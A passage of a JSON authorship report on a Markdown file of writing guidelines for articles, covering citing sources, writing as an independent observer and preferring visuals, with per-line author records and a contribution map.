        "content": "* **Do not re-invent the wheel by writing a lot of original content.** Instead, give a brief high-level view and point to other existing resources that you recommend the reader to use."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "  original source."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "  * Note that \u003d\u003dthe reader should still get a complete and useful picture\u003d\u003d even if she does not refer any of the given links. i.e., make the content self-contained and grounded/concrete instead of too abstract to be of much use. To that end, you may repeat/adapt content snippets from other resources (instead of simply giving a link) with proper attribution."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "  * If you reuse assets from other sources %%(e.g., diagrams)%%, remember to \u003d\u003dcite the original source\u003d\u003d."
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "* **Stay an _independent_ observer**. When writing about a tool/technique that has competing alternatives, the article will have more credibility if you write it from the point of view of an independent observer. For example, avoid unsubstantiated marketing claims e.g., _X is the best tool for doing Y_. Instead, you can cite quotes by other credible sources or from the tool/technique itself. See the two examples below:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003e Tool X claims to have the fastest performance [[source]()]."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003e [Tool X\u0027s website]() has the following to say about its performance:"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003e\u003e Tool X has the best performance of its class. ..."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "* **Prefer visuals rather than long paragraphs.**"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "* **Some of the existing articles might not follow the above guidelines** (the guidelines emerged over time). Feel free to revise existing content to fit the guidelines."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"tip\"\u003e"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "A fairly decent example of applying the above guidelines can be found in the article [_Introduction to Go_]({{ baseUrl }}/contents/go/Go.html)."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "iskandarzulkarnaien": 3,
      "-": 62
    }
  }
]
